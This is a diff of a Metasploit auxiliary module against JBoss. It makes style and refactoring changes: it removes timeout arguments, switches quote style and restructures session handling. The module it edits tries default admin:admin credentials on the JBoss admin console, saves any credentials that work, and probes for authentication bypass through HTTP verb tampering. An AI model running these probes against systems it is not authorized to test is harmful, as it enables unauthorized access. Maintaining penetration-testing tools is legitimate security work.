@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'       => "/" + Rex::Text.rand_text_alpha(12),
         'method'    => 'GET',
         'ctype'     => 'text/plain'
-      }, 20)
+      })
 
     if res
 
@@ -87,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
       'uri'       => app,
       'method'    => 'GET',
       'ctype'     => 'text/plain'
-    }, 20)
+    })
 
     if res
       case
@@ -118,22 +118,22 @@ class Metasploit3 < Msf::Auxiliary
     return false if session.nil?
 
     # Default AS creds
-    username = "admin"
-    password = "admin"
+    username = 'admin'
+    password = 'admin'
 
     res = send_request_raw({
-      "uri"      => "/admin-console/login.seam",
-      "method"   => "POST",
-      "version"  => "1.1",
-      "vhost"    => "#{rhost}",
-      "headers"  => { "Content-Type"  => "application/x-www-form-urlencoded",
-                      "Cookie"        => "JSESSIONID=#{session['jsessionid']}"
+      'uri'      => '/admin-console/login.seam',
+      'method'   => 'POST',
+      'version'  => '1.1',
+      'vhost'    => "#{rhost}",
+      'headers'  => { 'Content-Type'  => 'application/x-www-form-urlencoded',
+                      'Cookie'        => "JSESSIONID=#{session['jsessionid']}"
                     },
-      "data"     => "login_form=login_form&login_form%3Aname=#{username}&login_form%3Apassword=#{password}&login_form%3Asubmit=Login&javax.faces.ViewState=#{session["viewstate"]}"
-    }, 20)
+      'data'     => "login_form=login_form&login_form%3Aname=#{username}&login_form%3Apassword=#{password}&login_form%3Asubmit=Login&javax.faces.ViewState=#{session["viewstate"]}"
+    })
 
     # Valid creds if 302 redirected to summary.seam and not error.seam
-    if res && res.code == 302 && /error.seam/m !~ res.headers.to_s && /summary.seam/m =~ res.headers.to_s
+    if res && res.code == 302 && res.headers.to_s !~ /error.seam/m && res.headers.to_s =~ /summary.seam/m
       print_good("#{rhost}:#{rport} Authenticated using #{username}:#{password} at /admin-console/")
       add_creds(username, password)
     else
@@ -145,8 +145,8 @@ class Metasploit3 < Msf::Auxiliary
     service_data = {
       address: rhost,
       port: rport,
-      service_name: "jboss",
-      protocol: "tcp",
+      service_name: 'jboss',
+      protocol: 'tcp',
       workspace_id: framework.db.workspace.id
     }
 
@@ -165,22 +165,25 @@ class Metasploit3 < Msf::Auxiliary
 
   def jboss_as_session_setup(rhost, rport)
     res = send_request_raw({
-      'uri'       => "/admin-console/login.seam",
-      'method'    => "GET",
-      'version'   => "1.1",
+      'uri'       => '/admin-console/login.seam',
+      'method'    => 'GET',
+      'version'   => '1.1',
       'vhost'     => "#{rhost}"
-    }, 20)
+    })
 
-    if res
-      begin
-        viewstate = /javax.faces.ViewState" value="(.*)" auto/.match(res.body).captures[0]
-        jsessionid = /JSESSIONID=(.*);/.match(res.headers.to_s).captures[0]
-      rescue
-        print_status("#{rhost}:#{rport} Could not guess admin credentials")
-        return nil
-      end
-      return { "jsessionid" => jsessionid, "viewstate" => viewstate }
+    unless res
+      return nil
     end
+
+    begin
+      viewstate = /javax.faces.ViewState" value="(.*)" auto/.match(res.body).captures[0]
+      jsessionid = /JSESSIONID=(.*);/.match(res.headers.to_s).captures[0]
+    rescue ::NoMethodError
+      print_status("#{rhost}:#{rport} Could not guess admin credentials")
+      return nil
+    end
+
+    { 'jsessionid' => jsessionid, 'viewstate' => viewstate }
   end
 
   def bypass_auth(app)
@@ -190,7 +193,7 @@ class Metasploit3 < Msf::Auxiliary
       'uri'       => app,
       'method'    => datastore['VERB'],
       'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
-    }, 20)
+    })
 
     if res && res.code == 200
       print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering")
@@ -205,7 +208,7 @@ class Metasploit3 < Msf::Auxiliary
       'method'    => 'GET',
       'ctype'     => 'text/plain',
       'authorization' => basic_auth('admin', 'admin')
-    }, 20)
+    })
 
     if res && res.code == 200
       print_good("#{rhost}:#{rport} Authenticated using admin:admin at #{app}")
